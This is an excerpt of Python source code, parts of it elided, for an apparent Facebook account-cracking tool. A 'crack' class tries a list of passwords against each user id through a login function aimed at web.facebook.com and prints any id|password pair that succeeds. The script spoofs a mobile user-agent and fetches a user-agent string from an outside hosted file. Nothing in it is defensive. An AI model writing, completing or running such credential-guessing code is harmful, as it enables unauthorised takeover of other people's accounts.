...
ua=requests.get("https://hilman-toolkit2087.000webhostapp.com/useragent2.txt").text.strip()
uas=None
...
h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
...
class crack:
	...
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=login(fl.get("id"),
					i,"https://web.facebook.com")
				if log.get("status")=="success":
					print(G+"\r++ %s|%s ----> SUC%s      "%(fl.get("id"),i,N))
